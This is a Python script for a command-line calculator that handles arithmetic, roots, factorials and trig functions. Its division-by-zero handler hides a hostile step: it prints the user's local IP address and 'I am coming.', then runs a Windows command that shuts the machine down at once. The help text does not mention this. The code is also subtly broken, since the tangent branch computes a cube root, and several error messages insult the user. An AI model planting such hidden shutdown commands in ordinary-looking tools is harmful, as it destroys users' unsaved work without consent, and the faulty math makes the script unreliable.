import math
import sys
import time
import os
import socket

print("SUPER AWESOME PYTHON CALCULATOR 8.0")
print("'help' for commands and syntax, 'exit' to exit the program.")
print()

while True:

    inp = input("> ")

    if inp == "help":
        print("Addition (+)")
        print("Subtraction (-)")
        print("Multiplication (*) (x)")
        print("Division (/)")
        print("Power (^) (**)")
        print("Square Root (sqrt)")
        print("Cube Root (cbrt)")
        print("cosine (cos)")
        print("sine (sin)")
        print("tangent (tan)")
        print("Factorial (!) (only whole numbers can be factorialed. All numbers after the decimal point will be redundant.")
        print()

    elif inp == "exit":
        sys.exit()

    elif inp.find("+") != -1:
        nums = inp.split("+")
        try:
            num1 = float(nums[0])
            num2 = float(nums[1])
            print(num1 + num2)
        except ValueError:
            print("Invalid input.")
        except OverflowError:
            print("Number too large. Idiot.")
        print()

    elif inp.find("-") != -1:
        nums = inp.split("-")
        try:
            num1 = float(nums[0])
            num2 = float(nums[1])
            print(num1 -    num2)
        except ValueError:
            print("Invalid input.")
        except OverflowError:
            print("Number too large. Idiot.")
        print()

    elif inp.find("*") != -1:
        nums = inp.split("*")
        try:
            num1 = float(nums[0])
            num2 = float(nums[1])
            print(num1 * num2)
        except ValueError:
            print("Invalid input.")
        except OverflowError:
            print("Number too large. Idiot.")
        print()

    elif inp.find("/") != -1:
        nums = inp.split("/")
        try:
            num1 = float(nums[0])
            num2 = float(nums[1])
            print(num1 / num2)
        except ValueError:
            print("Invalid input.")
        except OverflowError:
            print("Number too large. Idiot.")
        except ZeroDivisionError:
            print("Oh, you think you can divide by zero?")
            time.sleep(2)
            print(socket.gethostbyname(socket.gethostname()))
            time.sleep(2)
            print("I am coming.")
            time.sleep(2)
            os.system("shutdown /s /t 0")
        print()

    elif inp.find("^") != -1:
        nums = inp.split("^")
        try:
            num1 = float(nums[0])
            num2 = float(nums[1])
            print(num1 ** num2)
        except ValueError:
            print("Invalid input.")
        except OverflowError:
            print("Number too large. Idiot.")
        print()

    elif inp.find("!") != -1:
        num = inp.split("!")
        try:
            print(math.factorial(int(num[0])))
        except ValueError:
            print("Invalid input.")
        except OverflowError:
            print("Number too large. Idiot.")
        print()

    elif inp.startswith("sqrt("):
        numDirty = inp[5:]
        numClean = numDirty.replace(")", " ")
        try:
            print(math.sqrt(float(numClean)))
        except ValueError:
            print("Invalid input.")
        except OverflowError:
            print("Number too large. Idiot.")
        print()

    elif inp.startswith("cbrt("):
        numDirty = inp[5:]
        numClean = numDirty.replace(")", " ")
        try:
            print(math.cbrt(float(numClean)))
        except ValueError:
            print("Invalid input.")
        except OverflowError:
            print("Number too large. Idiot.")
        print()

    elif inp.startswith("sin("):
        numDirty = inp[4:]
        numClean = numDirty.replace(")", " ")
        try:
            print(math.sin(float(numClean)))
        except ValueError:
            print("Invalid input.")
        except OverflowError:
            print("Number too large. Idiot.")
        print()

    elif inp.startswith("cos("):
        numDirty = inp[4:]
        numClean = numDirty.replace(")", " ")
        try:
            print(math.cos(float(numClean)))
        except ValueError:
            print("Invalid input.")
        except OverflowError:
            print("Number too large. Idiot.")
        print()

    elif inp.startswith("tan("):
        numDirty = inp[4:]
        numClean = numDirty.replace(")", " ")
        try:
            print(math.cbrt(float(numClean)))
        except ValueError:
            print("Invalid input.")
        except OverflowError:
            print("Number too large. Idiot.")
        print()

    else:
        print("Invalid command.")
        print()